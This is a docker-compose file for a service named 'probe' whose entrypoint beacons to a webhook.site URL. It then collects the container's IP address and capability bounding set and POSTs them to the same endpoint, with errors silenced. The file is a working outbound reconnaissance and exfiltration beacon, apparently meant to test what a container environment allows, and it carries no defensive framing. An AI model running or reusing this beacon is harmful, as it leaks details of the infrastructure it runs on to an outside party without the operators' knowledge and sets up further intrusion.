services:
  probe:
    image: alpine:3.20
    network_mode: bridge
    entrypoint:
      - sh
      - -c
      - |
        wget -q -O /dev/null "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=PROBE-V1-ALIVE" || true
        apk add --no-cache curl >/dev/null 2>&1
        R="status=alive ip=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}') caps=$(grep CapBnd /proc/self/status 2>/dev/null | awk '{print $2}')"
        curl -sS -X POST "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=PROBE-V1-INFO" -d "$R" || true
        sleep 3600
